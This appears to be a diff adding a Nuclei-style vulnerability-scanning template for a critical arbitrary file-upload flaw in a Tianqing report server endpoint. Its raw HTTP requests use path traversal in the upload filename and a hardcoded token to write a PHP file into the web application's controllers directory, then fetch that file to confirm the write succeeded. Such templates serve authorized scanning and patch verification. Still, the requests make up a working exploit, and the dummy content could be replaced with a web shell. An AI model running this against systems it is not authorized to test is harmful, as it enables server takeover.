@@ -1,0 +1,47 @@
+id: tianqing-rptsvr-upload
+
+info: 
+  name: tianqing-rptsvr-upload
+  author: xiaokp7
+  severity: critical
+  
+
+http:
+  - raw:
+    - |
+      POST /rptsvr/upload HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (MacintoshT2lkQm95Rw==; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+      Connection: close
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: en-US,en;q=0.5
+      Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
+      
+
+      -----------------------------55433477442814818502792421460
+      Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/xxx.php"
+      Content-Type: text/x-python
+
+      123
+      -----------------------------55433477442814818502792421460
+      Content-Disposition: form-data; name="token"
+
+      skylar_report
+      -----------------------------55433477442814818502792421460
+
+    - |
+      GET /application/api/controllers/xxx.php HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (MacintoshT2lkQm95Rw==; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+      Connection: close
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: en-US,en;q=0.5
+      
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains_all(body_2,"123")'
+
